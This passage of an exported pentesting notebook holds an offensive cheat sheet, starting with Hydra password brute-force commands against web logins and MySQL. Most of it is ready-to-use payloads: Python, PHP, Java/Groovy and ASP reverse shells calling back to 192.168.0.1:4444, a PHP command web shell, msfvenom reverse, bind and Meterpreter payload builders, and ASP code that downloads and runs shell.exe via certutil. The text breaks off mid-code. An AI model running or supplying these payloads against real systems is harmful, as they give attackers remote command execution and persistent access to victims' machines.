EIr6tsPG9rpfV11rH4cRghhMos9N197SQghbOGDLTOc0+bOG9vLdqgppyQr7tb+A9uP3a2c/1ySdP6PFcIBDr0sja16WzeRZwpfvwy9cuzU0RP+qdJmu2y+3+8uU1/NnTuqxzDnHrQwJ97v6J87D998WbMAyTNvn+TpM9tQBSG3ggprjuCU8kLJWHGU61SnuMnTJg/uOtCpB78sNzUudP82j+cf6sFmX1u3STh8udOYnk2YnDivbTu2H3pUNY8cpW43e+1qiw9LnXWauLZimuWyu7/cDUktqbMEABngaHUaPKzmhN+SzMLLu6TIuokwbLfLfOGq+T/1Gu/StyQz1v+Qy9ao3ic/yrrZ3Bt//J4/dOXkMXbqbG68z85d290efDrfmSThyPJFyquXjRgyowufQ5V7vTrt9VxS99dfknx6wUzRksUujgMnWQhTH11b8Ufy8LNru3/LRQEAAACAhkDpG5p97xjgv4Nrsey2+/hi17E/7Un4utb3by8BAAAAAADg3wPD/gAAAAAAAABkBVk3AAAAAAAAgKwg6wYAAAAAAACQFYzrBgAAAAAAAJAVtHUDAAAAAAAAyAqybgAAAAAAAABZQdYNAAAAAAAAICvIugEAAAAAAABkhWJZ9nOfGRh1bMxQAAAAAAAAAP5j0NYNAAAAAAAAICvIugEAAAAAAABkBVk3AAAAAAAAgKwg6wYAAAAAAACQFWTdAAAAAAAAALKCrBsAAAAAAABAVpB1AwAAAAAAAMgKsm4AAAAAAAAAWUHWDQAAAAAAACAryLoBAAAAAAAAZAVZNwAAAAAAAICsIOsGAAAAAAAAkBVk3QAAAAAAAACygqwbAAAAAAAAQFaQdQMAAAAAAADICrJuAAAAAAAAAFlB1g0AAAAAAAAgK8i6AQAAAAAAAGQFWTcAAAAAAACArCDrBgAAAAAAAJAVZN0AAAAAAAAAsoKsGwAAAAAAAEBWkHUDAAAAAAAAyAqybgAAAAAAAABZQdYNAAAAAAAAICvIugEAAAAAAABkBVk3AAAAAAAAgKwg6wYAAAAAAACQFWTdAAAAAAAAALJC6Ruafe8YAAAAAAAAAP6b0NYNAAAAAAAAICvIugEAAAAAAOD/2q9DGwBCAAiChv77xPAlgKODDclnxp07u1RUNwAAAFRUNwAAAFRUNwAAAFRUNwAAAFRUNwAAAFRUNwAAAFRUNwAAAFRUNwAAAFRUNwAAAFRUNwAAAFRUNwAAAFRUNwAAAFRUNwAAAFRUNwAAAFRUNwAAAFRUNwAAAFRUNwAAAFRUNwAAAFRUNwAAAFTGt+Ydez98AgAAAH9zABTc5qad+ZKpAAAAAElFTkSuQmCC</encoded_png>
        <encoded_png char_offset="67" justification="left" link=""></encoded_png>
      </node>
      <node name="Users" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1688505205" ts_lastsave="1688505430">
        <rich_text>Users:

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="8" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Craig Davidson -- Engineer
Jane Simpson --  Architect
Richard Wilson -- Civil Engineer</codebox>
      </node>
    </node>
    <node name="Methodology" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684267948" ts_lastsave="1687690629">
      <rich_text>

☐ </rich_text>
      <rich_text link="node 36">nmap</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 31">gobuster</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 33">nikto</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 37">FTP</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 34">smb</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 35">Active Directory</rich_text>
      <rich_text> 
☐ </rich_text>
      <rich_text link="node 32">ssh</rich_text>
      <node name="Brute Force" unique_id="57" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1687690684">
        <rich_text> </rich_text>
        <node name="Hydra" unique_id="58" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1687690629">
          <rich_text underline="single" scale="h1">Hydra</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">HTTP Basic Authentication</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.0.1 http-get /phpmyadmin/ -t 15</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">HTTP Get Request</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">hydra 192.168.0.1 -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&amp;password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">HTTP Post Request</rich_text>
          <rich_text>
Check request in BURP to see Post parameters. -l or -L has to be set, even if there is no user to login with!. Use </rich_text>
          <rich_text family="monospace">https-post-form</rich_text>
          <rich_text> instead of </rich_text>
          <rich_text family="monospace">http-post-form</rich_text>
          <rich_text> for HTTPS sites.

</rich_text>
          <rich_text family="monospace">hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form "/webapp/login.php:username=^USER^&amp;password=^PASS^:Invalid" -t 15</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">MYSQL</rich_text>
          <rich_text>
Change MYDATABASENAME. Default databasename is mysql.

</rich_text>
          <rich_text family="monospace">hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://192.168.0.1:3306/MYDATABASENAME -t 15</rich_text>
          <rich_text>

</rich_text>
        </node>
      </node>
      <node name="Shells" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687691258">
        <rich_text>

☐ </rich_text>
        <rich_text link="webs https://www.revshells.com/">https://www.revshells.com/</rich_text>
        <rich_text>
☐ moz-extension://c8e8314e-8d2e-4f3a-9b40-37d10c56988b/index.html </rich_text>
        <node name="Catching Reverse Shells (Nc)" unique_id="62" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Catching Reverse Shells (Netcat)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

rlwrap enables the usage of arrow keys in your shell. </rich_text>
          <rich_text link="webs https://github.com/hanslub42/rlwrap">https://github.com/hanslub42/rlwrap</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">rlwrap nc -nlvp 4444</rich_text>
        </node>
        <node name="Python" unique_id="67" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Python</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single">As Command:</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single">Python Code:</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">import</rich_text>
          <rich_text family="monospace"> socket,subprocess,os
s</rich_text>
          <rich_text family="monospace" foreground="#005cc5">=</rich_text>
          <rich_text family="monospace">socket.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">socket</rich_text>
          <rich_text family="monospace">(socket.</rich_text>
          <rich_text family="monospace" foreground="#e36209">AF_INET</rich_text>
          <rich_text family="monospace">,socket.</rich_text>
          <rich_text family="monospace" foreground="#e36209">SOCK_STREAM</rich_text>
          <rich_text family="monospace">)
s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">connect</rich_text>
          <rich_text family="monospace">(("192.168.0.1",</rich_text>
          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
          <rich_text family="monospace">));os.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
          <rich_text family="monospace">(s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
          <rich_text family="monospace">(),</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)
os.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
          <rich_text family="monospace">(s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
          <rich_text family="monospace">(),</rich_text>
          <rich_text family="monospace" foreground="#005cc5">1</rich_text>
          <rich_text family="monospace">)
os.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">dup2</rich_text>
          <rich_text family="monospace">(s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">fileno</rich_text>
          <rich_text family="monospace">(),</rich_text>
          <rich_text family="monospace" foreground="#005cc5">2</rich_text>
          <rich_text family="monospace">)
p</rich_text>
          <rich_text family="monospace" foreground="#005cc5">=</rich_text>
          <rich_text family="monospace">subprocess.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">call</rich_text>
          <rich_text family="monospace">(["/bin/sh","-i"])</rich_text>
        </node>
        <node name="PHP" unique_id="68" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text>PHP</rich_text>
          <node name="Kali Default PHP Reverse Shell" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Kali Default PHP Reverse Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text family="monospace">cat /usr/share/webshells/php/php-reverse-shell.php</rich_text>
          </node>
          <node name="Kali Default PHP CMD Shell" unique_id="70" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Kali Default PHP CMD Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text family="monospace">cat /usr/share/webshells/php/php-backdoor.php</rich_text>
          </node>
          <node name="CMD Shell" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">CMD Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
            <rich_text family="monospace">php </rich_text>
            <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
            <rich_text family="monospace"> system($_REQUEST["cmd"])</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;</rich_text>
            <rich_text family="monospace"> </rich_text>
            <rich_text family="monospace" foreground="#d73a49">?&gt;</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Call the CMD shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">http://192.168.0.1/cmd_shell.php</rich_text>
            <rich_text family="monospace" foreground="#d73a49">?</rich_text>
            <rich_text family="monospace">cmd=whoami</rich_text>
          </node>
          <node name="White WinterWolf Webshell" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">WhiteWinterWolf Webshell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text link="webs https://github.com/WhiteWinterWolf/wwwolf-php-webshell">https://github.com/WhiteWinterWolf/wwwolf-php-webshell</rich_text>
            <rich_text>
</rich_text>
          </node>
          <node name="PHP Reverse Shell" unique_id="73" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">PHP Reverse Shell</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Version 1</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
            <rich_text family="monospace">php </rich_text>
            <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
            <rich_text family="monospace"> shell_exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.1/4444 0&gt;&amp;1")</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;?&gt;</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Version 2</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" foreground="#d73a49">&lt;?</rich_text>
            <rich_text family="monospace">php $sock=fsockopen("192.168.0.1", 4444)</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;</rich_text>
            <rich_text family="monospace">exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2 &gt;&amp; 3")</rich_text>
            <rich_text family="monospace" foreground="#d73a49">;?&gt;</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">As Command</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">php -r '$sock=fsockopen("192.168.0.1",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</rich_text>
          </node>
        </node>
        <node name="MSFVENOM" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <node name="Windows Binary (.exe)" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Windows Binary (.exe)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">32 Bit (x86)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Output in Hex, C Style, Exclude bad chars, Exitfunction thread:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_bind_tcp LHOST=192.168.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">64 Bit (x64)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Meterpreter:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe</rich_text>
          </node>
          <node name="Linux Binary (.elf)" unique_id="76" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Linux Binary (.elf)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">32 Bit (x86)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> rev_shell.elf</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x86/shell/bind_tcp  LHOST=192.168.0.1 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> bind_shell.elf</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">64 Bit (x64)</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Reverse Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> rev_shell.elf</rich_text>
            <rich_text>

</rich_text>
            <rich_text underline="single">Bind Shell:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">msfvenom -p linux/x64/shell/bind_tcp LHOST=192.168.0.1 -f elf </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> rev_shell.elf</rich_text>
          </node>
          <node name="Java Server Pages (.jsp)" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Java Server Pages (.jsp)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
            <rich_text>

</rich_text>
            <rich_text family="monospace">msfvenom -p java/jsp_shell_reverse_tcp LHOST192.168.0.1 LPORT=4444 -f raw </rich_text>
            <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
            <rich_text family="monospace"> shell.jsp</rich_text>
          </node>
          <node name="Active Sever Pages Extended (.aspx)" unique_id="78" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
            <rich_text underline="single" scale="h1">Active Sever Pages Extended (aspx)</rich_text>
            <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
            <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
            <rich_text>

</rich_text>
            <rich_text family="monospace">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o rev_shell.aspx</rich_text>
          </node>
        </node>
        <node name="Active Sever Pages Extended (.apsx)" unique_id="79" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text scale="h2">Active Sever Pages Extended (.aspx)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Transfer A File (Certutil)</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
          <rich_text family="monospace">% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe")
o = </rich_text>
          <rich_text family="monospace" foreground="#6f42c1">cmd.StdOut.Readall</rich_text>
          <rich_text family="monospace">()
Response.write(o)
%</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Execute a File</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
          <rich_text family="monospace">% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
o = </rich_text>
          <rich_text family="monospace" foreground="#6f42c1">cmd.StdOut.Readall</rich_text>
          <rich_text family="monospace">()
Response.write(o)
%</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
</rich_text>
        </node>
        <node name="Jenkins / Groovy (Java)" unique_id="80" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Jenkins / Groovy (Java)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Linux Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">String host</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"192.168.0.1";
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">int</rich_text>
          <rich_text family="monospace"> port</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
          <rich_text family="monospace">;
String cmd</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"/bin/sh";
Process p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> ProcessBuilder(cmd)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">redirectErrorStream(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">true</rich_text>
          <rich_text family="monospace">)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">start();Socket s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> Socket(host,port);InputStream pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream(),pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getErrorStream(), si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getInputStream();OutputStream po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream(),so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">getOutputStream();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(</rich_text>
          <rich_text family="monospace" foreground="#d73a49">!</rich_text>
          <rich_text family="monospace">s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">isClosed()){</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pi</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(pe</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());</rich_text>
          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
          <rich_text family="monospace">(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">available()</rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
          <rich_text family="monospace">)po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">write(si</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">read());so</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();po</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">flush();Thread</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">sleep(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">50</rich_text>
          <rich_text family="monospace">);</rich_text>
          <rich_text family="monospace" foreground="#d73a49">try</rich_text>
          <rich_text family="monospace"> {p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">exitValue();</rich_text>
          <rich_text family="monospace" foreground="#d73a49">break</rich_text>
          <rich_text family="monospace">;}</rich_text>
          <rich_text family="monospace" foreground="#d73a49">catch</rich_text>
          <rich_text family="monospace"> (Exception e){}};p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">destroy();s</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">close();</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Windows Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">String host</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"192.168.0.1";
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">int</rich_text>
          <rich_text family="monospace"> port</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
          <rich_text family="monospace">;
String cmd</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
          <rich_text family="monospace">"cmd.exe";
Process p</rich_text>
          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
          <rich_text family="monospace"> ProcessBuilder(cmd)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">redirectErrorStream(</rich_text>
          <rich_text family="monospace" foreground="#005cc5">true</rich_text>
          <rich_text family="monospace">)</rich_text>
          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
          <rich_text family="monospace">start();Socket s</rich_text>
